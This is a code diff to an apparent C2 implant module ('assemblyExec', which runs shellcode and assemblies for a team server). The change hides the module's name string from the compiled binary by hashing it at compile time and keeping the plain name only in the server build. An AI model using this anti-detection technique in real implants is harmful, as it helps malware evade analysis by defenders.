@@ -4,6 +4,8 @@
 #include <sstream>
 #include <chrono>
 #include <thread>
+
+#include "Common.hpp"
 #include "Tools.hpp"
 
 #ifdef __linux__
@@ -26,8 +28,13 @@ const int maxDurationShellCode=120;
 
 using namespace std;
 
-const std::string moduleName = "assemblyExec";
+// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
+constexpr std::string_view moduleName = "assemblyExec";
+constexpr unsigned long moduleHash = djb2(moduleName);
+
+#ifdef BUILD_TEAMSERVER
 const std::string ToolsDirectoryFromTeamServer = "../Tools/";
+#endif
 
 
 #ifdef _WIN32
@@ -40,7 +47,11 @@ __declspec(dllexport) AssemblyExec* A_AssemblyExecConstructor()
 #endif
 
 AssemblyExec::AssemblyExec()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -295,11 +306,10 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #endif
 
-	
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(c2Message.cmd());
 	c2RetMessage.set_returnvalue(result);
-
+	
 	return 0;
 }
 
